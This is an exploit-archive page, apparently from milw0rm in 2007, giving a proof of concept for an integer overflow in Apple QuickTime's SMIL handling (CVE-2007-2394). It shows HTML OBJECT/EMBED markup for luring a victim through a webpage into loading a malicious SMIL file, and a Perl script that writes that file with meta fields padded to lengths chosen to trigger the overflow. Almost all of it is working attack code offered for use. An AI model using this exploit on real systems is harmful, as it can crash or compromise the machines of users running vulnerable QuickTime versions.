<html><head><title>Apple Quicktime < 7.2 SMIL Remote Integer Overflow PoC</title></head><pre>----------------------------------------------------------------------
ATTACK VECTORS
----------------------------------------------------------------------

This vulnerability can be triggered by luring a target user into
running a malicious SMIL file locally or via a webpage. In the later
scenario the OBJECT (IE) and/or EMBED (FireFox) tags can be used:

&lt;OBJECT
  CLASSID=&quot;clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B&quot;
  CODEBASE=&quot;http://www.apple.com/qtactivex/qtplugin.cab&quot;
  WIDTH=&quot;10&quot; HEIGHT=&quot;10&quot; &gt;
  &lt;!-- malicious SMIL file --&gt;
  &lt;PARAM NAME=&quot;src&quot; VALUE=&quot;poc.smil&quot; /&gt;
  &lt;EMBED
    &lt;!-- available .qtif or .mov file to start up QT for FF --&gt;
    SRC=&quot;available-sample.qtif&quot;
    &lt;!-- malicious SMIL file --&gt;
    QTSRC=&quot;poc.smil&quot;
    WIDTH=&quot;10&quot; HEIGHT=&quot;10&quot;
    PLUGINSPAGE=&quot; www.apple.com/quicktime/download&quot;
    TYPE=&quot;video/quicktime&quot;
  /&gt;
&lt;/OBJECT&gt;

----------------------------------------------------------------------
PROOF OF CONCEPT
----------------------------------------------------------------------

#!/usr/bin/perl -w

####
# QuickTime SMIL integer overflow vulnerability (CVE-2007-2394) POC
#
# Researched on QuickTime 7.1.3 on Windows 2000 SP4.
#
# David Vaartjes &lt;d.vaartjes at gmail.com&gt;
####

$file = &quot; poc.smil&quot;;
$padd = &quot;x&quot;;
$cop_len = 36;

####
# By choosing the following lengths the
# integer overflow will be triggered.
####

$tit_len = 223;
$auth_len = 65280;

open(FH,&quot;&gt;$file&quot;) or die &quot;Can't open file:$!&quot;;

print FH
 &quot;&lt;smil&gt;\n&quot;.
 &quot;&lt;head&gt;\n&quot;.
 &quot; &lt;meta name=\&quot;title\&quot; content=\&quot;&quot;.$padd x $tit_len.&quot;\&quot;/&gt;\n&quot;.
 &quot; &lt;meta name=\&quot;author\&quot; content=\&quot;&quot;.$padd x $auth_len.&quot;\&quot;/&gt;\n&quot;.
 &quot; &lt;meta name=\&quot;copyright\&quot; content=\&quot;&quot;.$padd x $cop_len.&quot;\&quot;/&gt;\n&quot;.
 &quot;&lt;/head&gt;\n&quot;.
 &quot;&lt;/smil&gt;&quot;;

close(FH);

# milw0rm.com [2007-09-03]</pre></html>